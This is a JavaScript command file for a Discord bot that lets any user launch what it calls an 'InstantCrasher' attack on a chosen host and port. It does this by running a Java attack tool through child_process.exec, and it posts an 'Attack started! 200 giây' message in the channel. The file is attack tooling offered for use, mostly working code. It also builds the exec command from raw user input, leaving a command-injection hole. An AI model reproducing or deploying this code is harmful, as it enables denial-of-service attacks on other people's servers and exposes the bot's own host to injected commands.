const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar 2.jar ${host}:${port} 15 1000 0`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **  🔥')
	.setTimestamp()
	.setDescription("**► Method: InstantCrasher 💥** \n \n ► Attack started! ✅ \n   ► Đã bắt đầu! ✅ \n ► 200 giây!! 🕒 \n ☆ ☆")
 
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['instant'],
  permLevel: 0
}

exports.help = {
  name: 'instant',
  description: 'Özel',
  usage: 'instant'
}